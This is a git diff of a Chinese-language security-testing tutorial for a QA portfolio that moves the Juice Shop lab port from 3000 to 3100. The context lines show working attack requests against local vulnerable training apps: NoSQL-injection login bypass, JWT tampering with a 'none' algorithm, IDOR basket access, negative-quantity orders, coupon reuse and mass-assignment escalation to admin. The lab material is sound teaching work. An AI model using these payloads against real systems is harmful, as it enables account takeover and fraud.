@@ -22,7 +22,7 @@ cd /Users/michaelzhou/Documents/github/michael-zhou-qa-portfolio/security-testin
 docker compose -f docker/docker-compose.yml up -d
 
 # 验证服务运行
-curl -I http://localhost:3000  # Juice Shop
+curl -I http://localhost:3100  # Juice Shop
 curl -I http://localhost       # DVWA
 ```
 
@@ -59,7 +59,7 @@ python3 -m pytest tests/test_juice_shop_api.py -v -s
 
 ```bash
 # 不带认证访问用户列表
-curl http://localhost:3000/api/Users/
+curl http://localhost:3100/api/Users/
 
 # 注意: 不要加 | jq，因为安全响应返回的是 HTML 而非 JSON
 # 如果 jq 报 "parse error: Invalid numeric literal"，说明返回了 HTML
@@ -78,17 +78,17 @@ curl http://localhost:3000/api/Users/
 
 ```bash
 # 1. 先注册用户获取 Token
-curl -X POST http://localhost:3000/api/Users/ \
+curl -X POST http://localhost:3100/api/Users/ \
   -H "Content-Type: application/json" \
   -d '{"email":"test123@test.com","password":"Test123!","passwordRepeat":"Test123!","securityQuestion":{"id":1},"securityAnswer":"test"}'
 
 # 2. 登录获取 Token
-curl -X POST http://localhost:3000/rest/user/login \
+curl -X POST http://localhost:3100/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"test123@test.com","password":"Test123!"}'
 
 # 3. 用获取的 Token 尝试访问其他用户的购物车 (Basket ID 1)
-curl http://localhost:3000/rest/basket/1 \
+curl http://localhost:3100/rest/basket/1 \
   -H "Authorization: Bearer <YOUR_TOKEN>"
 
 # 漏洞: 能访问他人购物车 = IDOR 漏洞
@@ -98,7 +98,7 @@ curl http://localhost:3000/rest/basket/1 \
 
 ```bash
 # 发送格式错误的请求触发错误
-curl -X POST http://localhost:3000/api/Users/ \
+curl -X POST http://localhost:3100/api/Users/ \
   -H "Content-Type: application/json" \
   -d 'not valid json'
 
@@ -134,7 +134,7 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImlkIjoxfX0.signature
 
 ```bash
 # 登录获取 Token
-TOKEN=$(curl -s -X POST http://localhost:3000/rest/user/login \
+TOKEN=$(curl -s -X POST http://localhost:3100/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"test123@test.com","password":"Test123!"}' | jq -r '.authentication.token')
 
@@ -181,7 +181,7 @@ tampered_token = f"{parts[0]}.{new_payload_b64}.{parts[2]}"
 
 # 测试篡改后的 Token
 response = requests.get(
-    "http://localhost:3000/rest/user/whoami",
+    "http://localhost:3100/rest/user/whoami",
     headers={"Authorization": f"Bearer {tampered_token}"}
 )
 
@@ -213,7 +213,7 @@ print("None Token:", none_token)
 
 # 测试
 response = requests.get(
-    "http://localhost:3000/rest/user/whoami",
+    "http://localhost:3100/rest/user/whoami",
     headers={"Authorization": f"Bearer {none_token}"}
 )
 
@@ -240,7 +240,7 @@ print("响应状态:", response.status_code)
 
 ```bash
 # 尝试绕过密码验证
-curl -X POST http://localhost:3000/rest/user/login \
+curl -X POST http://localhost:3100/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email": "admin@juice-sh.op", "password": {"$ne": ""}}'
 
@@ -252,7 +252,7 @@ curl -X POST http://localhost:3000/rest/user/login \
 
 ```bash
 # 使用 $gt 匹配任意用户
-curl -X POST http://localhost:3000/rest/user/login \
+curl -X POST http://localhost:3100/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email": {"$gt": ""}, "password": {"$gt": ""}}'
 ```
@@ -261,8 +261,8 @@ curl -X POST http://localhost:3000/rest/user/login \
 
 ```bash
 # 在搜索参数中注入
-curl "http://localhost:3000/rest/products/search?q='\$ne'=test"
-curl "http://localhost:3000/rest/products/search?q=' || '1'=='1"
+curl "http://localhost:3100/rest/products/search?q='\$ne'=test"
+curl "http://localhost:3100/rest/products/search?q=' || '1'=='1"
 ```
 
 ### 对比: SQL vs NoSQL 注入
@@ -295,11 +295,11 @@ curl "http://localhost:3000/rest/products/search?q=' || '1'=='1"
 TOKEN="YOUR_TOKEN"
 
 # 获取用户 basket ID
-curl http://localhost:3000/rest/user/whoami \
+curl http://localhost:3100/rest/user/whoami \
   -H "Authorization: Bearer $TOKEN" | jq
 
 # 添加负数量商品到购物车
-curl -X POST http://localhost:3000/api/BasketItems/ \
+curl -X POST http://localhost:3100/api/BasketItems/ \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"ProductId": 1, "BasketId": 6, "quantity": -5}'
@@ -311,7 +311,7 @@ curl -X POST http://localhost:3000/api/BasketItems/ \
 
 ```bash
 # 多次应用同一优惠券
-curl -X PUT "http://localhost:3000/rest/basket/6/coupon/WMNSDY2019" \
+curl -X PUT "http://localhost:3100/rest/basket/6/coupon/WMNSDY2019" \
   -H "Authorization: Bearer $TOKEN"
 
 # 重复执行，观察折扣是否叠加
@@ -321,13 +321,13 @@ curl -X PUT "http://localhost:3000/rest/basket/6/coupon/WMNSDY2019" \
 
 ```bash
 # 尝试修改用户角色为 admin
-curl -X PUT http://localhost:3000/api/Users/21 \
+curl -X PUT http://localhost:3100/api/Users/21 \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{"role": "admin", "isAdmin": true}'
 
 # 验证是否成功提权
-curl http://localhost:3000/rest/user/whoami \
+curl http://localhost:3100/rest/user/whoami \
   -H "Authorization: Bearer $TOKEN" | jq
 ```
 
@@ -345,7 +345,7 @@ curl http://localhost:3000/rest/user/whoami \
 
 ```
 1. Proxy (拦截请求)
-   └── 访问 http://localhost:3000
+   └── 访问 http://localhost:3100
    └── 拦截登录请求
    └── 修改参数测试注入
 
@@ -432,7 +432,7 @@ test_jwt_none_algorithm - XFAIL
 
 ### Juice Shop 挑战
 
-访问 http://localhost:3000/#/score-board 查看所有安全挑战
+访问 http://localhost:3100/#/score-board 查看所有安全挑战
 
 推荐挑战：
 - Login Admin - SQL 注入登录管理员
@@ -457,7 +457,7 @@ test_jwt_none_algorithm - XFAIL
 
 ```bash
 # 检查 Juice Shop 是否运行
-curl -I http://localhost:3000
+curl -I http://localhost:3100
 
 # 重启服务
 docker compose -f docker/docker-compose.yml restart juice-shop
@@ -478,7 +478,7 @@ docker compose -f docker/docker-compose.yml logs juice-shop
 
 ```bash
 # 先不加 jq 查看原始响应
-curl http://localhost:3000/api/Users/
+curl http://localhost:3100/api/Users/
 
 # 如果看到 HTML 401 错误，说明端点正确保护了
 # 如果需要访问，先获取 Token 再请求
